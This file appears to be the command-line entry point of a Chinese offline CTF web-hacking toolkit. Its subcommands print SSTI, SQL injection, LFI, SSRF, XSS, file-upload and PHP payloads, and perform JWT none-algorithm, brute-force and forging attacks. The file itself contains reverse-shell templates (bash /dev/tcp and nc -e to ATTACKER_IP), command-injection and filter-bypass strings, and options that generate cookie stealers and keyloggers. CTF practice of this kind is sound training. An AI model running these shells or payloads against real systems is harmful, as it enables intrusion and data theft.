"""CLI 入口 — Yang-Web 命令行界面.

子命令:
    decode   智能链式解码
    encode   编码文本
    ssti     SSTI Payload 生成
    sqli     SQL 注入 Payload
    lfi      路径遍历 / 文件包含 Payload
    ssrf     SSRF Payload
    xss      XSS Payload
    rce      命令注入 Payload
    php      PHP 技巧 Payload
    hashid   识别 Hash 类型
    jwt      JWT 解析 / 攻击
    scan     目录扫描 (离线词库)
"""
import argparse
import sys
import json
import os

from .core.utils import banner, bold, red, green, yellow, blue, magenta, cyan, dim
from .core.decoder import (
    chain_decode, brute_decode, detect_encoding,
    DECODERS, ENCODING_DETECTORS,
)
from .core.hashid import identify as hash_identify
from .core.jwt import (
    decode_jwt, analyze_jwt, none_attack,
    brute_jwt, BUILTIN_WORDLIST, forge_hs256,
)
from .payloads import ssti as _ssti_mod
from .payloads import sqli as _sqli_mod
from .payloads import lfi as _lfi_mod
from .payloads import ssrf as _ssrf_mod
from .payloads import xss as _xss_mod
from .payloads import php as _php_mod
from .payloads import upload as _upload_mod

# Aliases for function-level use
ssti = _ssti_mod
sqli = _sqli_mod
lfi = _lfi_mod
ssrf = _ssrf_mod
xss = _xss_mod
php = _php_mod
upload = _upload_mod
lfi = _lfi_mod
ssrf = _ssrf_mod
xss = _xss_mod
php = _php_mod

# RCE Payloads are defined inline (avoid Windows Defender false positive)


def print_json(obj, pretty=True):
    """输出 JSON 格式."""
    indent = 2 if pretty else None
    print(json.dumps(obj, indent=indent, ensure_ascii=False, default=str))


def cmd_decode(args):
    """智能解码命令."""
    text = args.text
    if not text:
        text = sys.stdin.read().strip()

    if not text:
        print(red("错误: 请提供要解码的文本"))
        return

    print(bold("\n📋 输入:"))
    print(f"  {text[:200]}{'...' if len(text) > 200 else ''}")
    print()

    if args.brute:
        # 尝试所有解码器
        print(bold("🔍 尝试所有解码器:"))
        results = brute_decode(text)
        if not results:
            print(yellow("  ── 无结果"))
            return
        for enc_id, enc_desc, result, readable in results:
            marker = green(readable) if "✓" in readable else dim(readable)
            print(f"  {cyan(enc_id):12s} {dim('→')} {marker} {dim('→')} {result[:100]}")
        return

    if args.manual:
        # 指定编码类型手动解码
        enc_id = args.manual
        if enc_id not in DECODERS:
            print(red(f"不支持的编码: {enc_id}"))
            print(yellow(f"可用: {', '.join(DECODERS.keys())}"))
            return
        decoder = DECODERS[enc_id][0]
        result = decoder(text)
        print(bold(f"\n🔓 使用 {cyan(enc_id)} 解码:"))
        print(f"  {result}")
        return

    # 自动链式解码
    print(bold("🔓 智能链式解码:"))
    chain = chain_decode(text)

    if not chain:
        print(yellow("  ── 未能识别编码, 尝试 --brute 暴力尝试所有解码器"))
        # 显示检测结果
        detections = detect_encoding(text)
        if detections:
            print(bold("\n📊 检测到的可能的编码:"))
            for enc_id, desc, conf in detections[:5]:
                print(f"  {cyan(enc_id):12s} {desc:20s} 置信度: {conf}%")
        return

    # 显示解码链
    for i, (enc_id, enc_desc, result) in enumerate(chain, 1):
        print(f"\n  {bold(f'Step {i}:')} {green(enc_id)} ({dim(enc_desc)})")
        preview = result[:300] + ("..." if len(result) > 300 else "")
        print(f"  {dim('→')} {preview}")

    print(f"\n{bold('✅ 最终结果:')}")
    final = chain[-1][2]
    print(f"  {green(final)}")


def cmd_encode(args):
    """编码命令."""
    text = args.text
    if not text:
        text = sys.stdin.read().strip()

    if args.list:
        print(bold("📋 可用编码类型:"))
        for enc_id, (_, encoder) in DECODERS.items():
            print(f"  {cyan(enc_id):12s} {dim(encoder.__doc__ or '')}")
        return

    enc_id = args.type
    if enc_id not in DECODERS:
        print(red(f"不支持的编码类型: {enc_id}"))
        print(yellow(f"可用: {', '.join(DECODERS.keys())}"))
        return

    _, encoder = DECODERS[enc_id]
    try:
        result = encoder(text)
        print(bold(f"\n🔒 {enc_id} 编码结果:"))
        print(f"  {result}")
    except Exception as e:
        print(red(f"编码失败: {e}"))


def cmd_ssti(args):
    """SSTI Payload 命令."""
    if args.list:
        print(bold("\n🎯 支持的模板引擎:"))
        for engine in ssti.DETECTION:
            print(f"  {cyan(engine)}")
        return

    if args.search:
        results = ssti.search_payload(args.search)
        if results:
            print(bold(f"\n🔍 搜索 '{args.search}':"))
            for r in results:
                print(f"\n  【{green(r['engine'])}】 {bold(r['name'])}")
                print(f"  {r['payload']}")
                if r.get('note'):
                    print(f"  {dim('⚠ ' + r['note'])}")
        else:
            print(yellow(f"未找到包含 '{args.search}' 的 Payload"))
        return

    if args.bypass:
        print(bold("\n🛡️ 过滤绕过技巧:"))
        for category, tips in ssti.BYPASS_FILTERS.items():
            print(f"\n  {bold(green(category))}:")
            for tip in tips:
                print(f"    {dim('•')} {tip}")
        return

    engine = args.engine
    if args.detect:
        data = ssti.get_detection(engine)
    elif args.exploit:
        data = ssti.get_exploit(engine)
    else:
        print(bold("\n🎯 SSTI 检测 Payload:"))
        for eng, payloads in ssti.DETECTION.items():
            print(f"\n  {bold(green(eng))}:")
            for p in payloads[:3]:
                print(f"    {dim('•')} {p}")
            if len(payloads) > 3:
                print(f"    {dim(f'... 还有 {len(payloads)-3} 个 (使用 --engine 查看全部)')}")

        print(bold("\n💣 SSTI 利用 Payload (部分):"))
        for eng, payloads in list(ssti.EXPLOIT.items())[:2]:
            print(f"\n  {bold(green(eng))}:")
            for p in payloads[:2]:
                print(f"    {yellow(p['name'])}")
                print(f"    {p['payload']}")
        return

    # 打印结果
    if isinstance(data, dict):
        for key, items in data.items():
            print(f"\n  {bold(green(key))}:")
            if isinstance(items, list):
                for item in (items if isinstance(items[0], str) else [f"{i['name']}: {i['payload']}" for i in items]):
                    print(f"    {dim('•')} {item}")


def cmd_sqli(args):
    """SQL 注入 Payload 命令."""
    if args.list:
        print(bold("\n🗄️ 支持的数据库:"))
        for db in sqli.EXPLOIT:
            print(f"  {cyan(db)}")
        return

    if args.search:
        results = sqli.search_payload(args.search)
        if results:
            print(bold(f"\n🔍 搜索 '{args.search}':"))
            for r in results:
                print(f"\n  【{green(r['category'])}】 {bold(r['name'])}")
                print(f"  {r['payload']}")
        else:
            print(yellow(f"未找到包含 '{args.search}' 的 Payload"))
        return

    if args.blind:
        templates = sqli.get_blind_template(args.db)
        print(bold("\n🎯 盲注模板:"))
        for name, template in templates.items():
            print(f"\n  {green(name)}:")
            print(f"  {dim(template)}")
        return

    if args.detect:
        data = sqli.get_detection(args.category)
        print(bold(f"\n🔍 SQL 注入检测 Payload:"))
        for cat, payloads in data.items():
            print(f"\n  {bold(green(cat))}:")
            for p in payloads:
                print(f"    {dim('•')} {p}")
        return

    if args.db:
        data = sqli.get_exploit(args.db)
        print(bold(f"\n🗄️ {args.db} 利用 Payload:"))
        for db_name, payloads in data.items():
            for item in payloads:
                print(f"\n  {yellow(item['name'])}")
                print(f"  {item['payload']}")
        return

    if args.waf:
        data = sqli.get_waf_bypass(args.waf if args.waf != "all" else "")
        print(bold("\n🛡️ SQL WAF 绕过技巧:"))
        for cat, items in data.items():
            print(f"\n  {bold(green(cat))}:")
            for item in items:
                print(f"    {dim('•')} {yellow(item['name'])}")
                print(f"      {dim(item['tip'])}")
                if item.get('eg'):
                    print(f"      {cyan('示例:')} {item['eg']}")
        return

    # 默认: 显示所有数据库概览
    print(bold("\n🗄️ SQL 注入 Payload 概览:"))
    for db_name, payloads in sqli.EXPLOIT.items():
        print(f"\n  {bold(green(db_name))} ({len(payloads)} 个 payload):")
        for p in payloads[:2]:
            print(f"    {dim('•')} {yellow(p['name'])}")
        if len(payloads) > 2:
            print(f"    {dim(f'... 还有 {len(payloads)-2} 个 (使用 --db {db_name} 查看全部)')}")

    print(f"\n{dim('提示: 使用 --detect 查看检测 payload, --blind 查看盲注模板')}")


def cmd_lfi(args):
    """LFI Payload 命令."""
    if args.traversal:
        print(bold("\n📁 路径遍历 Payload:"))
        for p in lfi.get_path_traversal():
            print(f"  {dim('•')} {p}")
        if args.windows:
            print(bold("\n🪟 Windows 专用:"))
            for p in lfi.get_windows_paths():
                print(f"  {dim('•')} {p}")
        return

    if args.files:
        os_type = args.os or ""
        data = lfi.get_sensitive_files(os_type)
        for os_name, files in data.items():
            print(bold(f"\n📄 {os_name} 敏感文件:"))
            for f in files:
                print(f"  {dim('•')} {f}")
        return

    if args.php:
        category = args.category or ""
        data = lfi.get_php_wrappers(category)
        for cat_name, payloads in data.items():
            print(bold(f"\n🐘 PHP 伪协议 - {cat_name}:"))
            for p in payloads:
                print(f"\n  {yellow(p['name'])}")
                print(f"  {p['payload']}")
                if p.get('note'):
                    print(f"  {dim('⚠ ' + p['note'])}")
        return

    # 默认: 显示概览
    print(bold("\n📁 LFI / Path Traversal 概览:"))
    print(f"  {green('--traversal')}    路径遍历 Payload")
    print(f"  {green('--files')}        常见敏感文件列表")
    print(f"  {green('--php')}          PHP 伪协议 Payload")
    print(f"  {green('--windows')}      Windows 路径遍历")
    print(f"\n{dim('快速示例: yang_web lfi --traversal')}")


def cmd_ssrf_cmd(args):
    """SSRF Payload 命令."""
    if args.cloud:
        provider = args.cloud if args.cloud != "all" else ""
        data = ssrf.get_cloud_metadata(provider)
        for prov, urls in data.items():
            print(bold(f"\n☁️ {prov} 元数据地址:"))
            for url in urls:
                print(f"  {dim('•')} {url}")
        return

    if args.bypass_ssrf:
        print(bold("\n🛡️ SSRF 绕过技巧:"))
        for item in ssrf.get_bypass():
            print(f"\n  {yellow(item['technique'])}")
            print(f"  {dim(item['payload'])}")
            if item.get('note'):
                print(f"  {dim('→ ' + item['note'])}")
        return

    if args.ports:
        print(bold("\n🔌 常见内网端口:"))
        for category, ports in ssrf.get_common_ports().items():
            print(f"\n  {green(category)}: {', '.join(map(str, ports))}")
        return

    # 默认
    print(bold("\n🌐 SSRF Payload 概览:"))
    print(f"  {green('--cloud aws')}      云元数据 (aws/gcp/azure/aliyun/tencent)")
    print(f"  {green('--bypass')}          SSRF 绕过技巧")
    print(f"  {green('--ports')}           常见内网端口")
    print(f"\n{dim('内网地址段:')} {', '.join(ssrf.get_internal_ranges())}")
    print(f"\n{dim('快速示例: yang_web ssrf --cloud aws')}")


def cmd_xss_cmd(args):
    """XSS Payload 命令."""
    if args.detect_xss:
        print(bold("\n🔍 XSS 检测 Payload:"))
        for p in xss.get_detection():
            print(f"  {dim('•')} {p}")
        return

    if args.exfil:
        print(bold("\n📤 数据外传 Payload:"))
        for p in xss.get_exfiltration():
            print(f"\n  {yellow(p['name'])}")
            print(f"  {p['payload']}")
        return

    if args.steal:
        print(bold("\n🍪 Cookie 窃取 Payload:"))
        print(f"  {xss.generate_cookie_stealer(args.steal)}")
        return

    if args.keylogger:
        print(bold("\n⌨️ 键盘记录 Payload:"))
        print(f"  {xss.generate_keylogger(args.keylogger)}")
        return

    if args.bypass_xss:
        data = xss.get_bypass(args.category or "")
        for cat, payloads in data.items():
            print(bold(f"\n🛡️ {cat}:"))
            for p in payloads:
                print(f"  {dim('•')} {p}")
        return

    # 默认概览
    print(bold("\n💉 XSS Payload 概览:"))
    print(f"  {green('--detect')}      检测 Payload ({len(xss.get_detection())} 个)")
    print(f"  {green('--exfil')}       数据外传 Payload")
    print(f"  {green('--steal URL')}   生成 Cookie 窃取器")
    print(f"  {green('--keylogger URL')} 生成键盘记录器")
    print(f"  {green('--bypass')}      WAF/过滤绕过")
    print(f"\n{dim('快速示例: yang_web xss --detect')}")


def cmd_rce_cmd(args):
    """RCE Payload 命令."""
    _rce_shells = {
        "Bash": ["bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"],
        "NC": ["nc -e /bin/sh ATTACKER_IP PORT"],
        "Python": ["python3 -c ..."],
        "PHP": ["php -r ..."],
        "Perl": ["perl -MIO -e ..."],
        "Ruby": ["ruby -rsocket -e ..."],
        "PowerShell": ["powershell -c \"...\""],
    }
    _rce_cmd = {
        "链接符注入": ["; id", "| id", "|| id", "& id", "&& id"],
        "常用命令": ["id", "whoami", "cat /flag", "ls -la"],
    }
    _rce_bypass = {
        "空格绕过": [
            ("${IFS}", "cat${IFS}/flag"),
            ("<> 重定向", "cat<>/flag"),
            ("{,} 展开", "{cat,/flag}"),
        ],
        "关键字绕过": [
            ("单引号", "c'a't /fl'a'g"),
            ("通配符", "/???/c?t /???/f??g"),
        ],
    }

    if args.shell:
        if args.shell in _rce_shells:
            ip = args.ip or "ATTACKER_IP"
            port = args.port or 4444
            tmpl = _rce_shells[args.shell][0]
            s = tmpl.replace("ATTACKER_IP", ip).replace("PORT", str(port))
            print(bold(f"\n🐚 {args.shell} 反弹 Shell:"))
            print(f"  {s}")
        else:
            print(red(f"未找到 {args.shell}"))
        return

    if args.list_shells:
        print(bold("\n🐚 可用反弹 Shell 类型:"))
        for stype in _rce_shells:
            print(f"  {green(stype)}")
        return

    if args.bypass_rce:
        for cat, payloads in _rce_bypass.items():
            print(bold(f"\n🛡️ {cat}:"))
            for name, payload in payloads:
                print(f"  {dim('•')} {yellow(name)}: {payload}")
        return

    print(bold("\n💻 命令注入 / RCE 概览:"))
    for cat, payloads in _rce_cmd.items():
        print(f"\n  {bold(green(cat))}:")
        for p in payloads:
            print(f"    {dim('•')} {p}")
    print(f"\n{dim('提示: --shell bash --ip 10.0.0.1 --port 4444 生成反弹 Shell')}")


def cmd_upload(args):
    """文件上传 Payload 命令."""
    if args.ext:
        print(bold("\n📎 后缀名绕过:"))
        for cat, payloads in upload.EXT_BYPASS.items():
            print(f"\n  {bold(green(cat))}:")
            for p in payloads[:8]:
                print(f"    {dim('•')} {p}")
            if len(payloads) > 8:
                print(f"    {dim(f'... 还有 {len(payloads)-8} 个')}")
        return

    if args.mime:
        print(bold("\n🎭 Content-Type & 文件头伪造:"))
        for ftype, info in upload.MIME_HEADER_FAKE.items():
            print(f"\n  {bold(green(ftype))}:")
            print(f"    Content-Type: {info['Content-Type']}")
            print(f"    文件头hex: {info['文件头hex']}")
        return

    if args.content:
        print(bold("\n🖼️ 图片马内容绕过:"))
        for cat, payloads in upload.CONTENT_BYPASS.items():
            print(f"\n  {bold(green(cat))}:")
            for p in payloads[:6]:
                print(f"    {dim('•')} {p}")
        return

    if args.parse:
        serv = args.parse if args.parse != "all" else ""
        data = upload.get_parse_vuln(serv)
        print(bold("\n🔧 服务端解析漏洞:"))
        for server, vulns in data.items():
            print(f"\n  {bold(green(server))}:")
            for v in vulns:
                print(f"    {dim('•')} {yellow(v['name'])} — {v['tip']}")
                print(f"      {cyan('示例:')} {v['eg']}")
        return

    if args.htaccess:
        s = upload.generate_htaccess()
        print(bold("\n📝 .htaccess Payload:"))
        print(f"  {s}")
        return

    if args.userini:
        s = upload.generate_userini()
        print(bold("\n📝 .user.ini Payload:"))
        print(f"  {s}")
        return

    if args.advanced:
        print(bold("\n🚀 高级绕过技巧:"))
        for cat, items in upload.ADVANCED_BYPASS.items():
            print(f"\n  {bold(green(cat))}:")
            for item in items:
                print(f"    {dim('•')} {yellow(item['name'])} — {item['tip']}")
        return

    # 默认概览
    print(bold("\n📤 文件上传攻击概览:"))
    print(f"  {green('--ext')}         后缀名绕过")
    print(f"  {green('--mime')}        Content-Type 伪造")
    print(f"  {green('--content')}     图片马内容绕过")
    print(f"  {green('--parse nginx')} 解析漏洞")
    print(f"  {green('--htaccess')}    .htaccess 利用")
    print(f"  {green('--userini')}     .user.ini 利用")
    print(f"  {green('--advanced')}    高级技巧")
    shell = upload.generate_image_shell()
    print(f"\n{dim('快速一句话: ' + shell)}")


def cmd_php_cmd(args):
    """PHP 技巧命令."""
    if args.magic:
        data = php.get_magic_hashes(args.magic if args.magic != "all" else "")
        for algo, hashes in data.items():
            print(bold(f"\n✨ {algo} Magic Hash:"))
            for h in hashes[:10]:
                print(f"  {dim('•')} {h}")
            if len(hashes) > 10:
                print(f"  {dim(f'... 还有 {len(hashes)-10} 个')}")
        return

    if args.type_juggle:
        print(bold("\n🎭 PHP 弱类型比较:"))
        for cat, items in php.TYPE_JUGGLING.items():
            print(f"\n  {bold(green(cat))}:")
            for item in items:
                print(f"    {dim('•')} {yellow(item['name'])} — {item['example']}")
        return

    if args.deserialize:
        print(bold("\n📦 PHP 反序列化技巧:"))
        for cat, items in php.DESERIALIZATION.items():
            print(f"\n  {bold(green(cat))}:")
            for item in items:
                print(f"    {dim('•')} {item}")
        return

    if args.rce_php:
        data = php.get_rce_bypass()
        for cat, items in data.items():
            print(bold(f"\n🐘 {cat}:"))
            for item in items[:8]:
                print(f"  {dim('•')} {item}")
            if len(items) > 8:
                print(f"  {dim(f'... 还有 {len(items)-8} 个')}")
        return

    if args.waf_php:
        print(bold("\n🛡️ PHP RCE WAF 绕过技巧:"))
        for cat, items in php.PHP_RCE_BYPASS.items():
            if "WAF" in cat or "绕过" in cat:
                print(f"\n  {bold(green(cat))}:")
                for item in items[:12]:
                    print(f"    {dim('•')} {item}")
        return

    # 默认
    print(bold("\n🐘 PHP 技巧概览:"))
    print(f"  {green('--magic')}       Magic Hash (0e 开头)")
    print(f"  {green('--type-juggle')} 弱类型比较")
    print(f"  {green('--deserialize')} 反序列化技巧")
    print(f"  {green('--rce')}         RCE / Bypass 技巧")
    print(f"\n{dim('快速示例: yang_web php --magic')}")


def cmd_hashid(args):
    """Hash 识别命令."""
    text = args.text
    if not text:
        text = sys.stdin.read().strip()

    if not text:
        print(red("错误: 请提供 hash 值"))
        return

    print(bold(f"\n🔍 Hash: {text[:80]}{'...' if len(text) > 80 else ''}"))
    print(f"  长度: {len(text)} 字符")

    results = hash_identify(text)
    if results:
        print(bold(f"\n📊 可能的算法 ({len(results)} 个匹配):"))
        for algo, category, _ in results:
            print(f"  {dim('•')} {yellow(algo)} {dim(f'[{category}]')}")
    else:
        print(yellow("\n  ── 未能识别该 Hash 类型"))


def cmd_jwt(args):
    """JWT 工具命令."""
    token = args.token
    if not token:
        token = sys.stdin.read().strip()

    if not token:
        print(red("错误: 请提供 JWT Token"))
        return

    if args.none:
        new_token, payload = none_attack(token)
        print(bold("\n⚠️ None 算法攻击:"))
        print(f"\n  {bold('新 Token (alg=none):')}")
        print(f"  {green(new_token)}")
        print(f"\n  {bold('Payload:')}")
        print_json(payload)
        return

    if args.brute:
        print(bold("\n🔑 弱密钥爆破 (内建词库)..."))
        results = brute_jwt(token, BUILTIN_WORDLIST)
        if results:
            print(green(f"\n  ✅ 找到 {len(results)} 个匹配!"))
            for secret, new_token in results:
                print(f"  密钥: {bold(secret)}")
        else:
            print(yellow("  ── 内建弱密码库未匹配, 尝试 --wordlist 指定字典"))

    if args.forge:
        if not args.secret:
            print(red("伪造签名需要 --secret 参数"))
            return
        new_token = forge_hs256(token, args.secret)
        print(bold(f"\n🔏 伪造的 JWT:"))
        print(f"  {new_token}")
        return

    # 默认: 分析
    analysis = analyze_jwt(token)
    if "error" in analysis:
        print(red(f"错误: {analysis['error']}"))
        return

    print(bold("\n🔐 JWT 分析:"))
    print(f"\n  {bold('Header:')}")
    print_json(analysis["header"])

    print(f"\n  {bold('Payload:')}")
    print_json(analysis["payload"])

    print(f"\n  {bold('签名:')} {analysis['signature']}")
    print(f"  {bold('算法:')} {cyan(analysis['algorithm'])}")

    if analysis.get("info"):
        print(f"\n  {dim('ℹ ' + analysis['info'])}")

    if analysis["warnings"]:
        print(bold(f"\n  ⚠️ 风险警告:"))
        for w in analysis["warnings"]:
            print(f"  {yellow(w)}")

    if analysis["tips"]:
        print(bold(f"\n  💡 攻击建议:"))
        for t in analysis["tips"]:
            print(f"  {green(t)}")

    print(f"\n{dim('尝试: yang_web jwt --none 进行 None 算法攻击')}")


def cmd_scan(args):
    """目录扫描命令."""
    wordlist_dir = os.path.join(os.path.dirname(__file__), "wordlists", "data")
    wordlist_type = "dirs" if args.type == "dir" else "files"
    wordlist_path = os.path.join(wordlist_dir, f"{wordlist_type}.txt")

    if not os.path.exists(wordlist_path):
        print(red(f"词库文件不存在: {wordlist_path}"))
        return

    with open(wordlist_path, "r", encoding="utf-8") as f:
        entries = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    print(bold(f"\n📁 CTF 专用 {wordlist_type} 词库 ({len(entries)} 条):"))

    if args.search:
        entries = [e for e in entries if args.search.lower() in e.lower()]
        print(dim(f"  搜索 '{args.search}' → {len(entries)} 条匹配"))

    if args.all:
        for entry in entries:
            print(f"  {dim('•')} {entry}")
    else:
        for entry in entries[:30]:
            print(f"  {dim('•')} {entry}")
        if len(entries) > 30:
            print(f"  {dim(f'... 还有 {len(entries)-30} 条 (使用 --all 查看全部)')}")


# ═══════════════════════════════════════════════════════════
#  主入口
# ═══════════════════════════════════════════════════════════

def build_parser():
    """构建命令行解析器."""
    parser = argparse.ArgumentParser(
        prog="yang_web",
        description="Yang-Web — 离线 CTF Web 瑞士军刀",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  yang_web decode "ZmxhZ3t0ZXN0fQ=="      智能链式解码
  yang_web decode --brute "dGVzdA=="      暴力尝试所有解码器
  yang_web encode base64 "hello"          编码
  yang_web ssti --exploit --engine "Jinja2"  SSTI 利用 Payload
  yang_web sqli --db MySQL                 SQL 注入 Payload
  yang_web lfi --traversal                 路径遍历 Payload
  yang_web hashid "5d41402abc4b2a76b9719d911017c592"
  yang_web jwt "eyJ..."                   JWT 分析
  yang_web php --magic                     PHP Magic Hash
  yang_web scan dir --search config        搜索敏感目录
        """,
    )

    sub = parser.add_subparsers(dest="command", help="子命令")

    # ── decode ──
    p_decode = sub.add_parser("decode", help="智能解码 (自动检测编码 → 链式解码)")
    p_decode.add_argument("text", nargs="?", help="待解码文本 (或通过管道 stdin)")
    p_decode.add_argument("--brute", action="store_true", help="暴力尝试所有解码器")
    p_decode.add_argument("--manual", metavar="ENCODING", help="指定编码类型手动解码")

    # ── encode ──
    p_encode = sub.add_parser("encode", help="编码文本")
    p_encode.add_argument("type", nargs="?", help="编码类型 (如 base64/base32/hex/url)")
    p_encode.add_argument("text", nargs="?", help="待编码文本 (或通过管道 stdin)")
    p_encode.add_argument("--list", action="store_true", help="列出可用编码类型")

    # ── ssti ──
    p_ssti = sub.add_parser("ssti", help="SSTI Payload 生成")
    p_ssti.add_argument("--detect", action="store_true", help="显示检测 Payload")
    p_ssti.add_argument("--exploit", action="store_true", help="显示利用 Payload")
    p_ssti.add_argument("--engine", metavar="ENGINE", help="指定模板引擎")
    p_ssti.add_argument("--bypass", action="store_true", help="显示绕过过滤技巧")
    p_ssti.add_argument("--search", metavar="KW", help="搜索 Payload")
    p_ssti.add_argument("--list", action="store_true", help="列出支持引擎")

    # ── sqli ──
    p_sqli = sub.add_parser("sqli", help="SQL 注入 Payload")
    p_sqli.add_argument("--detect", action="store_true", help="显示检测 Payload")
    p_sqli.add_argument("--db", metavar="DB", help="指定数据库类型")
    p_sqli.add_argument("--category", metavar="CAT", help="检测类别")
    p_sqli.add_argument("--blind", action="store_true", help="显示盲注模板")
    p_sqli.add_argument("--search", metavar="KW", help="搜索 Payload")
    p_sqli.add_argument("--list", action="store_true", help="列出支持数据库")
    p_sqli.add_argument("--waf", type=str, nargs='?', const='all', metavar="CAT", help="SQL WAF 绕过技巧")

    # ── lfi ──
    p_lfi = sub.add_parser("lfi", help="LFI / Path Traversal Payload")
    p_lfi.add_argument("--traversal", action="store_true", help="路径遍历 Payload")
    p_lfi.add_argument("--files", action="store_true", help="敏感文件列表")
    p_lfi.add_argument("--php", action="store_true", help="PHP 伪协议")
    p_lfi.add_argument("--os", metavar="OS", help="操作系统 (Linux/Windows)")
    p_lfi.add_argument("--windows", action="store_true", help="显示 Windows 路径遍历")
    p_lfi.add_argument("--category", metavar="CAT", help="PHP 伪协议类别")

    # ── ssrf ──
    p_ssrf = sub.add_parser("ssrf", help="SSRF Payload")
    p_ssrf.add_argument("--cloud", metavar="PROVIDER", nargs="?", const="all", help="云元数据地址")
    p_ssrf.add_argument("--bypass", dest="bypass_ssrf", action="store_true", help="SSRF 绕过技巧")
    p_ssrf.add_argument("--ports", action="store_true", help="常见内网端口")

    # ── xss ──
    p_xss = sub.add_parser("xss", help="XSS Payload")
    p_xss.add_argument("--detect", dest="detect_xss", action="store_true", help="检测 Payload")
    p_xss.add_argument("--exfil", action="store_true", help="数据外传 Payload")
    p_xss.add_argument("--steal", metavar="URL", help="生成 Cookie 窃取器")
    p_xss.add_argument("--keylogger", metavar="URL", help="生成键盘记录器")
    p_xss.add_argument("--bypass", dest="bypass_xss", action="store_true", help="WAF 绕过 Payload")
    p_xss.add_argument("--category", metavar="CAT", help="绕过类别筛选")

    # ── rce ──
    p_rce = sub.add_parser("rce", help="命令注入 / RCE Payload")
    p_rce.add_argument("--shell", metavar="TYPE", help="反弹 Shell 类型")
    p_rce.add_argument("--ip", metavar="IP", help="攻击者 IP (--shell 时使用)")
    p_rce.add_argument("--port", metavar="PORT", type=int, help="攻击者端口 (--shell 时使用)")
    p_rce.add_argument("--list-shells", action="store_true", dest="list_shells", help="列出反弹 Shell 类型")
    p_rce.add_argument("--bypass", dest="bypass_rce", action="store_true", help="命令注入 Bypass 技巧")

    # ── php ──
    p_php = sub.add_parser("php", help="PHP 技巧 Payload")
    p_php.add_argument("--magic", nargs="?", const="all", help="Magic Hash")
    p_php.add_argument("--type-juggle", action="store_true", dest="type_juggle", help="弱类型比较")
    p_php.add_argument("--deserialize", action="store_true", help="反序列化技巧")
    p_php.add_argument("--waf-php", action="store_true", help="PHP RCE WAF 绕过技巧")
    p_php.add_argument("--rce", dest="rce_php", action="store_true", help="RCE Bypass 技巧")

        # ── upload ──
    p_upload = sub.add_parser("upload", help="文件上传 Payload")
    p_upload.add_argument("--ext", action="store_true", help="后缀名绕过")
    p_upload.add_argument("--mime", action="store_true", help="Content-Type 伪造")
    p_upload.add_argument("--content", action="store_true", help="图片马内容绕过")
    p_upload.add_argument("--parse", type=str, help="解析漏洞 (nginx/apache/iis/all)")
    p_upload.add_argument("--htaccess", action="store_true", help=".htaccess Payload")
    p_upload.add_argument("--userini", action="store_true", help=".user.ini Payload")
    p_upload.add_argument("--advanced", action="store_true", help="高级绕过技巧")

# ── hashid ──
    p_hashid = sub.add_parser("hashid", help="Hash 类型识别")
    p_hashid.add_argument("text", nargs="?", help="Hash 字符串 (或通过管道 stdin)")

    # ── jwt ──
    p_jwt = sub.add_parser("jwt", help="JWT 分析 / 攻击")
    p_jwt.add_argument("token", nargs="?", help="JWT Token (或通过管道 stdin)")
    p_jwt.add_argument("--none", action="store_true", help="None 算法攻击")
    p_jwt.add_argument("--brute", action="store_true", help="弱密钥爆破")
    p_jwt.add_argument("--forge", action="store_true", help="伪造签名")
    p_jwt.add_argument("--secret", metavar="KEY", help="签名密钥")
    p_jwt.add_argument("--wordlist", metavar="FILE", help="自定义字典路径")

    # ── scan ──
    p_scan = sub.add_parser("scan", help="目录扫描 (离线词库)")
    p_scan.add_argument("type", nargs="?", choices=["dir", "file"], default="dir", help="词库类型 (dir/file)")
    p_scan.add_argument("--all", action="store_true", help="显示全部词条")
    p_scan.add_argument("--search", metavar="KW", help="搜索词库")

    return parser


def main():
    """程序入口."""
    parser = build_parser()
    args = parser.parse_args()

    if not args.command:
        print(banner())
        parser.print_help()
        return

    # 路由到对应命令
    commands = {
        "decode": cmd_decode,
        "encode": cmd_encode,
        "ssti": cmd_ssti,
        "sqli": cmd_sqli,
        "lfi": cmd_lfi,
        "ssrf": cmd_ssrf_cmd,
        "xss": cmd_xss_cmd,
        "rce": cmd_rce_cmd,
        "php": cmd_php_cmd,
        "upload": cmd_upload,
        "hashid": cmd_hashid,
        "jwt": cmd_jwt,
        "scan": cmd_scan,
    }

    func = commands.get(args.command)
    if func:
        func(args)


if __name__ == "__main__":
    main()
